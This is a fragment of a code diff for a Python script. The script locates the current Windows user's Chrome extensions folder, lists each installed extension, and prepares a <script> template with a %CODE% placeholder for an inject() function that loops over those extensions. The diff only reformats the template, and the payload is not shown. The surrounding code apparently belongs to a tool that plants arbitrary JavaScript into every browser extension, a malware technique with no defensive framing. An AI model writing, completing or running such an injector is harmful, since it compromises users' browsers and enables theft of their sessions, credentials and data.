@@ -2,7 +2,9 @@ import os
 folder = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions'
 sub_folders = [name for name in os.listdir(folder) if os.path.isdir(os.path.join(folder, name))]
 script = r'''
-<script>%CODE%</script>
+<script>
+%CODE%
+</script>
 '''
 def inject():
     for i in range(len(sub_folders)):
